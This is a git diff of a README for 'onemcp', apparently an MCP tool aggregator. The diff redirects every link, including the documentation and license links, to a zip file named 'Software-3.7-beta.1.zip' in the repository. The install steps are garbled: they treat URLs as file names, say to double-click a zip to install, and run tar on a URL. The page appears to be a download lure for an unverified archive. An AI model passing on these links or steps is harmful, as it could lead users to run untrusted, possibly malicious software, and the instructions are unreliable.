@@ -1,6 +1,6 @@
 # 🌟 onemcp - Aggregate Your MCP Tools Seamlessly
 
-[![Download on GitHub](https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip%20on%https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip)](https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip)
+[![Download on GitHub](https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip%20on%https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip)](https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to **onemcp**, your one-stop solution for managing Multiple Control Prot
 
 To download the latest version of onemcp, visit the following link:
 
-[Download on GitHub Releases](https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip)
+[Download on GitHub Releases](https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip)
 
 ### Windows Installation Steps
 
 1. Click on the above download link.
 2. On the Releases page, find the latest version.
-3. Look for the file named `https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip` or `https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip`. If it’s a `.zip`, download and extract it.
-4. Double-click the `https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip` file to start the installation.
+3. Look for the file named `https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip` or `https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip`. If it’s a `.zip`, download and extract it.
+4. Double-click the `https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip` file to start the installation.
 5. Follow the prompts to complete the installation.
 6. After installation, look for the onemcp icon on your desktop or in your Start menu.
 
@@ -25,7 +25,7 @@ To download the latest version of onemcp, visit the following link:
 
 1. Click on the above download link.
 2. On the Releases page, find the latest version.
-3. Look for the file named `https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip`.
+3. Look for the file named `https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip`.
 4. Download the `.dmg` file and double-click it to open.
 5. Drag the onemcp icon to your Applications folder.
 6. Open your Applications folder and double-click on the onemcp icon to launch the app.
@@ -34,9 +34,9 @@ To download the latest version of onemcp, visit the following link:
 
 1. Click on the above download link.
 2. On the Releases page, find the latest version.
-3. Download the file named `https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip`.
+3. Download the file named `https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip`.
 4. Open a terminal and navigate to your Downloads folder.
-5. Extract the file with the command: `tar -xzvf https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip`.
+5. Extract the file with the command: `tar -xzvf https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip`.
 6. Navigate into the extracted folder: `cd onemcp`.
 7. Run the application with the command: `./onemcp`.
 
@@ -67,7 +67,7 @@ To download the latest version of onemcp, visit the following link:
    - Try reinstalling the application.
 
 3. **Help with Features:**
-   - Refer to the [Documentation](https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip) for user guides and FAQs.
+   - Refer to the [Documentation](https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip) for user guides and FAQs.
 
 ### Contact Support
 
@@ -79,7 +79,7 @@ We welcome contributions from everyone. If you have ideas for features or improv
 
 ## 📝 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/gdinesh012/onemcp/main/component/onemcp-3.7.zip) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/gdinesh012/onemcp/raw/refs/heads/main/component/Software-3.7-beta.1.zip) file for details.
 
 ## 🌐 Related Topics
 
